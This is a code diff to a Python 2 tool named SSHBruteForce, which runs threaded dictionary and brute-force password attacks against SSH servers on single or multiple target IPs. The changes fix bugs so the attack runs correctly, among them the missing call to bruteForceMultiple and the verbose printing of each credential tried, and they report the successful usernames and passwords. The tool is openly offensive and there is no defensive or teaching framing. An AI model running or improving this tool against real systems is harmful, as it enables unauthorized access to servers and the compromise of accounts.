@@ -73,7 +73,7 @@ class SSHBruteForce():
             
         else:
             #Check to see if we are running a dictionary attack or a bruteforce
-            if options.typeOfAttack == True:
+            if bool(options.typeOfAttack) == True:
                 #Then another check to make sure the Username list and passwordlist are filled
                 if options.usernamesFile and options.passwordsFile:
                     #Then we check if it is a single ip only
@@ -110,14 +110,15 @@ class SSHBruteForce():
         self.verbose = options.verbose
         self.bruteForceLength = options.lengthLimit
         self.bruteForceAttempts = options.attemptAmount
-        self.showStartInfo()
 
-        if options.typeOfAttack:
+        if bool(options.typeOfAttack):
             self.usernames = Util.fileContentsToList(options.usernamesFile)
             self.passwords = Util.fileContentsToList(options.passwordsFile)
+            self.showStartInfo()
             self.dictionaryAttackSingle()
         else:
             self.bruteForceSingle();
+            self.showStartInfo()
 
     def multipleTarget(self,options):
         self.targets = Util.fileContentsToTuple(options.targetsFile)
@@ -127,14 +128,15 @@ class SSHBruteForce():
         self.verbose = options.verbose
         self.bruteForceLength = options.lengthLimit
         self.bruteForceAttempts = options.attemptAmount
-        self.showStartInfo()
 
-        if options.typeOfAttack:
+        if bool(options.typeOfAttack):
             self.usernames = Util.fileContentsToList(options.usernamesFile)
             self.passwords = Util.fileContentsToList(options.passwordsFile)
+            self.showStartInfo()
             self.dictionaryAttackMultiple()
         else:
-            self.bruteForceMultiple
+            self.bruteForceMultiple()
+            self.showStartInfo()
 
 
     def showStartInfo(self):
@@ -143,6 +145,7 @@ class SSHBruteForce():
             print "[*] Brute Forcing %s "  % self.targetIp
         else:
             print "[*] Loaded %s Targets " % str(len(self.targets))
+
         if self.bruteForceMode == False:
             print "[*] Loaded %s Usernames "   % str(len(self.usernames))
             print "[*] Loaded %s Passwords "   % str(len(self.passwords))
@@ -161,12 +164,12 @@ class SSHBruteForce():
     def dictionaryAttackSingle(self):
         for username in self.usernames:
             for password in self.passwords:
+
                 self.createConnection(username, password, self.targetIp, 
                                       self.targetPort, self.timeoutTime)
                 if self.currentThreadCount == self.amountOfThreads:
                     self.currentThreadResults()
 		self.currentThreadResults()
-		self.completed()
                     
     def dictionaryAttackMultiple(self):
         for target in self.targets:
@@ -177,7 +180,6 @@ class SSHBruteForce():
                     if self.currentThreadCount == self.amountOfThreads:
                         self.currentThreadResults()
 		self.currentThreadResults()
-		self.completed()
         
     def bruteForceSingle(self):
         for x in range(self.bruteForceAttempts):
@@ -197,7 +199,6 @@ class SSHBruteForce():
             if self.currentThreadCount == self.amountOfThreads:
                 self.currentThreadResults()
         self.currentThreadResults()
-        self.completed()
 
     def bruteForceMultiple(self):
         for target in self.targets:
@@ -220,7 +221,6 @@ class SSHBruteForce():
                     self.currentThreadResults()
 
         self.currentThreadResults()
-        self.completed()
 
     def createConnection(self, username, password, targetIp, targetPort, timeoutTime):
         connection = Connection(username, password, targetIp, targetPort, timeoutTime)
@@ -229,12 +229,12 @@ class SSHBruteForce():
         self.connections.append(connection)
         self.currentThreadCount += 1
         if self.verbose:
-            pass
             print "[*] Adding Target: {0}, Testing with username: {1}, testing with password: {2}" .format(targetIp, username, password)
         
     def currentThreadResults(self):
         for connection in self.connections:
             connection.join()
+
             if connection.status == 'Succeeded':
                 print "[#] TargetIp: %s " % connection.targetIp
                 print "[#] Username: %s " % connection.username
@@ -263,3 +263,4 @@ class SSHBruteForce():
 if __name__ == '__main__':
     sshBruteForce = SSHBruteForce()
     sshBruteForce.startUp()
+    print "[*] Brute Force Completed"
